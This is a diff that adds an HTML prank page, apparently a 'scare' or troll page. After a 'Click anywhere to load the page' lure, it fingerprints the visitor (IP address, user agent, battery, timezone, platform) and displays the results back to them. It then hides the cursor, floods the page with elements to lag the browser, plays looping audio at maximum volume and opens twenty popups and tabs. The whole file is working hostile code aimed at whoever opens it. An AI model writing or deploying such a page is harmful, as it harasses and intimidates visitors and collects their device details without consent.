@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stuff Maje</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            overflow: hidden;
+            background: url('https://uploads.onecompiler.io/437rezxye/438m92bxn/IMG_0111.gif') no-repeat center center;
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        #user-info {
+            text-align: center;
+            max-width: 80%;
+            margin: 20px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            font-size: 18px;
+        }
+        #cursor-freeze {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100px;
+            height: 100px;
+            background: transparent;
+            cursor: none;
+            transform: translate(-50%, -50%);
+        }
+        #click-to-load {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 24px;
+            color: red;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+    <div id="click-to-load">Click anywhere to load the page</div>
+    <div id="cursor-freeze"></div>
+    <div id="user-info" style="display: none;"></div>
+
+    <audio id="audioElement" src="https://flying-scarlet-do7efylbnn.edgeone.app/Daniel%20Beenards%20Last%20Words%20(SAD).mp3" loop></audio>
+
+    <script>
+        async function fetchIP() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+
+        function getUserAgent() {
+            return navigator.userAgent;
+        }
+
+        function getScreenResolution() {
+            return `${window.screen.width} x ${window.screen.height}`;
+        }
+
+        function getDeviceMemory() {
+            return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
+        }
+
+        function getBatteryStatus() {
+            if (navigator.getBattery) {
+                return navigator.getBattery().then(battery => {
+                    return `Charge: ${battery.charging ? 'Charging' : 'Discharging'}, Level: ${battery.level * 100}%`;
+                });
+            } else {
+                return Promise.resolve('Battery status not available');
+            }
+        }
+
+        function getTimezone() {
+            return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+        }
+
+        function getLanguage() {
+            return navigator.language;
+        }
+
+        function getPlatform() {
+            return navigator.platform;
+        }
+
+        function getCookiesEnabled() {
+            return navigator.cookieEnabled ? 'Enabled' : 'Disabled';
+        }
+
+        function getOnlineStatus() {
+            return navigator.onLine ? 'Online' : 'Offline';
+        }
+
+        function getUserInfo() {
+            return Promise.all([
+                fetchIP(),
+                getUserAgent(),
+                getScreenResolution(),
+                getDeviceMemory(),
+                getBatteryStatus(),
+                getTimezone(),
+                getLanguage(),
+                getPlatform(),
+                getCookiesEnabled(),
+                getOnlineStatus()
+            ]).then(([ip, userAgent, resolution, memory, battery, timezone, language, platform, cookies, online]) => {
+                return `
+                    <p>IP Address: ${ip}</p>
+                    <p>User Agent: ${userAgent}</p>
+                    <p>Screen Resolution: ${resolution}</p>
+                    <p>Device Memory: ${memory}</p>
+                    <p>Battery Status: ${battery}</p>
+                    <p>Timezone: ${timezone}</p>
+                    <p>Language: ${language}</p>
+                    <p>Platform: ${platform}</p>
+                    <p>Cookies: ${cookies}</p>
+                    <p>Online Status: ${online}</p>
+                `;
+            });
+        }
+
+        function freezeCursor() {
+            const cursorFreeze = document.getElementById('cursor-freeze');
+            cursorFreeze.style.cursor = 'none';
+            document.body.style.cursor = 'none';
+        }
+
+        function lagBrowser() {
+            const interval = setInterval(() => {
+                const div = document.createElement('div');
+                div.style.position = 'absolute';
+                div.style.top = `${Math.random() * 100}%`;
+                div.style.left = `${Math.random() * 100}%`;
+                div.style.width = `${Math.random() * 50}px`;
+                div.style.height = `${Math.random() * 50}px`;
+                div.style.background = `rgba(0, 0, 0, 0.5)`;
+                document.body.appendChild(div);
+            }, 10);
+            setTimeout(() => clearInterval(interval), 5000);
+        }
+
+        function openPopupsAndTabs() {
+            const numPopups = 10; // Number of popups to open
+            const numTabs = 10; // Number of tabs to open
+            const interval = 500; // Interval between openings in milliseconds
+
+            for (let i = 0; i < numPopups; i++) {
+                setTimeout(() => {
+                    window.open('', '_blank', 'width=400,height=300');
+                }, i * interval);
+            }
+
+            for (let i = 0; i < numTabs; i++) {
+                setTimeout(() => {
+                    const url = `https://www.google.com/search?q=Daniel+Beenards+Last+Words`;
+                    window.open(url, '_blank');
+                }, i * interval);
+            }
+        }
+
+        document.addEventListener('click', () => {
+            const clickToLoad = document.getElementById('click-to-load');
+            clickToLoad.style.display = 'none';
+
+            getUserInfo().then(info => {
+                document.getElementById('user-info').innerHTML = info;
+                document.getElementById('user-info').style.display = 'block';
+            });
+
+            freezeCursor();
+            lagBrowser();
+            const audioElement = document.getElementById('audioElement');
+            audioElement.volume = 1.0; // Set volume to maximum
+            audioElement.play().catch(() => {
+                // If autoplay fails, try again after a short delay
+                setTimeout(() => audioElement.play(), 1000);
+            });
+
+            openPopupsAndTabs();
+        });
+    </script>
+</body>
+</html>
